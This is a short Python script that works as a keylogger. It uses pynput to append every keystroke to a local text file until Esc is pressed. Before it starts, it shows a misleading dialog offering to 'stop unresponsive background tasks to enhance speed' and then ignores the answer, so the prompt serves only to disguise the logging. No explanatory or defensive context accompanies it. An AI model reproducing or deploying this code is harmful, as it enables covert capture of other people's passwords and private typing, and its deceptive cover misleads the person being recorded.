import pynput
from pynput import keyboard
import tkinter 
from tkinter import *
from tkinter import messagebox


message = tkinter.messagebox.askyesno(title=None, message="Would you like to stop running unresponsive background tasks to enhance speed?")

space = keyboard.Key.space

def press(key):
    space = keyboard.Key.space
    with open("keysfromcomp.txt",'a') as f:
        try:
            f.write(key.char)
        except AttributeError:
                f.write(str(key)) 
        if key == space:
            f.write('\n')
             
def quit(key):
    if key == keyboard.Key.esc:
        return False
    

with keyboard.Listener(on_press=press,on_release=quit) as listener:
    listener.join()


